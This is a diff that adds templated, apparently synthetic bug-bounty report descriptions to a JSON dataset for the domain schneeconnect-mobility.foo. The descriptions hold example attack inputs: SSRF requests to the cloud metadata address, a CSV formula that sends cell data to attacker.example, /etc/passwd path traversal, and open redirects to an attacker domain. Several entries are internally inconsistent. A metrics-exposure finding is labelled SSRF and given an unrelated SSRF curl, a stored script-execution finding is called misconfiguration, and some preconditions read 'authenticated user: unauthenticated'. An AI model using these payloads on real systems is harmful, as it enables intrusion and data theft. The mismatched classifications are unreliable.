+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15762,7 +15884,8 @@
           "offset": "3d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.schneeconnect-mobility.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15878,7 +16001,8 @@
           "offset": "3d",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.schneeconnect-mobility.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16022,7 +16146,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.schneeconnect-mobility.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16162,7 +16287,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16250,7 +16376,8 @@
           "offset": "1d 4h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.schneeconnect-mobility.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16390,7 +16517,8 @@
           "offset": "3d 1h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16522,7 +16650,8 @@
           "offset": "8d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.schneeconnect-mobility.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16666,7 +16795,8 @@
           "offset": "4d 17h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.schneeconnect-mobility.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16786,7 +16916,8 @@
           "offset": "3d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16914,7 +17045,8 @@
           "offset": "6d 22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.schneeconnect-mobility.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17017,7 +17149,8 @@
           "offset": "3d 22h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.schneeconnect-mobility.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17172,7 +17305,8 @@
           "offset": "8d 3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.schneeconnect-mobility.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17312,7 +17446,8 @@
           "offset": "5d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17466,7 +17601,8 @@
           "offset": "2d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17596,7 +17732,8 @@
           "offset": "2d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17699,7 +17836,8 @@
           "offset": "4d 5h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.schneeconnect-mobility.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17831,7 +17969,8 @@
           "offset": "4h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schneeconnect-mobility.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -17979,7 +18118,8 @@
           "offset": "3d 3h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.schneeconnect-mobility.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18089,7 +18229,8 @@
           "offset": "3d 12h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.schneeconnect-mobility.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18247,7 +18388,8 @@
           "offset": "7d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18397,7 +18539,8 @@
           "offset": "8d 12h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://app.schneeconnect-mobility.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18553,7 +18696,8 @@
           "offset": "5d 17h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://pay.schneeconnect-mobility.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -18652,7 +18796,8 @@
           "offset": "2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://app.schneeconnect-mobility.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18784,7 +18929,8 @@
           "offset": "5d 14h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://pay.schneeconnect-mobility.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18911,7 +19057,8 @@
           "offset": "3d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://pay.schneeconnect-mobility.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19038,7 +19185,8 @@
           "offset": "3d 16h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://app.schneeconnect-mobility.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19145,7 +19293,8 @@
           "offset": "1d 11h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://app.schneeconnect-mobility.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19301,7 +19450,8 @@
           "offset": "7d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://app.schneeconnect-mobility.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19424,7 +19574,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://pay.schneeconnect-mobility.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19515,7 +19666,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://app.schneeconnect-mobility.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19616,7 +19768,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
